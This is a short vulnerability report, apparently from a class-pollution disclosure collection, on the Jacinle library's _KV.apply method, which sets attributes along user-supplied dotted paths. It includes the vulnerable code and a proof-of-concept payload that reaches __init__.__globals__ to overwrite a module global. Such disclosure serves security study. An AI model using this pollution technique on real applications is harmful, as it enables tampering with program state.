## Jacinle

### Meta

+ Library: Jacinle
+ Stars: 135
+ Version: N/A
+ CVE: N/A
+ Status: Pending
+ Payload: ```_KV('__init__.__globals__.__name__=polluted').apply(obj)```
+ Foundby: redacted
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/vacancy/Jacinle

### Vulnerable Code Snippet

```python
def apply(self, configs):
    with print_to(logger.info):
        print('Applying KVs:')
        for k, v in self.kvs:
            print('  kv.{} = {}'.format(k, v))
            keys = k.split('.')
            current = configs
            for k in keys[:-1]:
                try:
                    current = getattr(current, k)
                except AttributeError:
                    current = current.setdefault(k, G())

            try:
                setattr(current, keys[-1], v)
            except AttributeError:
                current[keys[-1]] = v
```
### PoC

```python
from jacinle.cli.argument import _KV
import subprocess
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

kv = _KV('__init__.__globals__.__name__=polluted').apply(obj)
print(__name__)
```